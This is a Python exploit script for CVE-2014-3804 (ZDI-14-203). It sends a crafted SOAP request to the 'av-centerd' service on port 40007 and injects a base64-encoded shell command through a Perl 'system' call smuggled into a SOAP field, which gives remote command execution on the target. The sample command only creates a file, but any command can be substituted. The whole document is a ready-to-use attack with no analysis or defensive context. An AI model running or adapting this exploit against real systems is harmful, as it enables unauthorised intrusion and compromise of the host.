#! /usr/bin/python

"""
ZDI-14-203
CVE-2014-3804
"""

import base64
import string
import random
import urllib

target = "192.168.1.240"
command = "touch /tmp/file.txt"

def rand_text_alpha(len):
	return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(len))

def encode_base64(command):
	return base64.b64encode(command)

def soapRequest(target, command):
	perl_payload =  "system(decode_base64"
	perl_payload += "(\"%s\"))" % encode_base64(command)

	soap =  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
	soap += "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\n"
	soap += "xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\r\n"
	soap += "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n"
	soap += "soap:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n"
	soap += "<soap:Body>\r\n"
	soap += "<set_file xmlns=\"AV/CC/Util\">\r\n"
	soap += "<c-gensym3 xsi:type=\"xsd:string\">All</c-gensym3>\r\n"
	soap += "<c-gensym5 xsi:type=\"xsd:string\">423d7bea-cfbc-f7ea-fe52-272ff7ede3d2</c-gensym5>\r\n"
	soap += "<c-gensym7 xsi:type=\"xsd:string\">%s</c-gensym7>\r\n"		% target
	soap += "<c-gensym9 xsi:type=\"xsd:string\">%s</c-gensym9>\r\n" 	% rand_text_alpha(15)
	soap += "<c-gensym11 xsi:type=\"xsd:string\">&amp; perl -MMIME::Base64 -e '%s' </c-gensym11>\r\n"	% perl_payload
	soap += "<c-gensym13 xsi:type=\"xsd:string\">%s</c-gensym13>\r\n"	% rand_text_alpha(32)
	soap += "<c-gensym15 xsi:type=\"xsd:string\">%s</c-gensym15>\r\n"	% rand_text_alpha(15)
	soap += "<c-gensym17 xsi:type=\"xsd:string\">%s</c-gensym17>\r\n"	% rand_text_alpha(15)
	soap += "<c-gensym19 xsi:type=\"xsd:string\">%s</c-gensym19>\r\n"	% rand_text_alpha(15)
	soap += "<c-gensym21 xsi:type=\"xsd:string\">%s</c-gensym21>\r\n"	% rand_text_alpha(3)
	soap += "</set_file>\r\n"
	soap += "</soap:Body>\r\n"
	soap += "</soap:Envelope>\r\n"

	return soap

def main(target, command):
	url = "https://%s:40007/av-centerd" % target
	headers = {
		"Content-Type": 'text/xml; charset=UTF-8',
		"SOAPAction": '"AV/CC/Util#set_file"'
	}
	h = httplib2.Http(disable_ssl_certificate_validation=True)
	res, content = h.request(url, method="POST", headers=headers, body=soapRequest(target, command))
	
	print content

if __name__ == "__main__":
	try:
		import httplib2
	except ImportError:
		print "[-] Please install 'httplib2'..."
		print "[*] sudo pip install httplib2"

	main(target, command)
